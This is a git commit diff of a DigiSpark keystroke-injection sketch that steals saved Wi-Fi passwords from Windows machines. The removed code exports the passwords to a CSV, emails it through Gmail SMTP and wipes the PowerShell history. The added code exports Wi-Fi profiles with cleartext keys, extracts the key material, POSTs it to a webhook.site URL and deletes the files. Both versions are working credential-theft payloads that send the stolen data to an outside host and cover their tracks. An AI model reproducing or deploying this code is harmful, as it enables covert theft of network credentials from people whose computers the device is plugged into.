7ea0f48f6f60242dc59e995cd621b1f502421c74
Júlio Carneiro <juliocarneiro@gmail.com>
2021-12-31 12:32:43 -0300

    Update wifi-profile-mailer.ino

--- wifi-profile-mailer.ino
+++ wifi-profile-mailer.ino
@@ -1,54 +1,44 @@
-//This DigiSpark script writes the wireless network credentials to a csv file and emails it.
-//Credits to p0wc0w.
-
-//NOTE about the New Version of this script: The older script stopped working on newer builds of Windows 10
-//since Windows 10 now require an elevated cmd or powershell to execute these commands. This version should
-//be faster (better, stronger...) and should work on all builds of Windows 10. For previous versions 
-//of Windows or simply older builds of Windows 10, the other version works like a charm.
-
 #include "DigiKeyboard.h"
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_ENTER 0x28 //Return/Enter Key
+
 void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
 }
 
 void loop() {
+   
+  DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path temp.csv;exit"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
-  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_MAIL'; $ReportEmail.To.Add('RECEIVER_MAIL'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("del temp.csv"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.print(F("exit"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for(;;){ /*empty*/ }
+  DigiKeyboard.println("cmd /k mode"); //smallest cmd window possible
+  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(500);
+  for(int i =0; i < 100; i++)
+    {
+      DigiKeyboard.sendKeyStroke(KEY_DOWN);
+    }
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cd %temp%"); //going to temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/YOUR_KEY -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.delay(100);
+  
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+  
 }
